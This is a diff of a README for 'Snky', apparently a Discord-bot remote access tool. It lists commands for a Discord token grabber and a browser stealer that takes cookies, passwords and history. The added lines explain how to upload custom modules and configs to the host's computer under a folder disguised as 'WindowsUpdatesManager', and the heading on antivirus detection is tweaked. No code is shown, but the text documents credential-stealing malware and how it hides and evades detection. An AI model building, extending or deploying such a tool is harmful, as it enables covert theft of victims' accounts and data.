@@ -39,8 +39,6 @@ Current commands:
 - **.token_grab** - Run a discord token grabber.
 - **.browser_grab** - Run a browser stealer. Collects cookies, password, data, history and download history.
 
-This project supports custom modules. If you want to add your own script (not a command), create it and put it into the ```/modules``` folder. The bot runs these when launching itself. For reference see ```example_module.py``` in ```/modules```
-
 ## Instalation - User
 - Create a new discord bot application at https://discord.com/developers/applications.
 - Copy the token.
@@ -58,9 +56,14 @@ The powershell code will install Python 3.10.11, latest version of Snky and crea
 
 The speed IS affected by network speed.
 
+## Custom Modules
+This project has custom module support! You can create your own module and then upload it into the host's computer using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/modules``
+
+You can also create configs for your modules (load and use them IN YOUR MODULE). Upload them using ``.upload C:/users/user/AppData/Local/WindowsUpdatesManager/Snky-main/cfg``
+
 ## Known Bugs
 - None
 
-## AVs that detect Snky
+## AVs that detect Snky (THAT I TESTED)
 
 - MS Defender ❌️ - Last detection: 19.1.
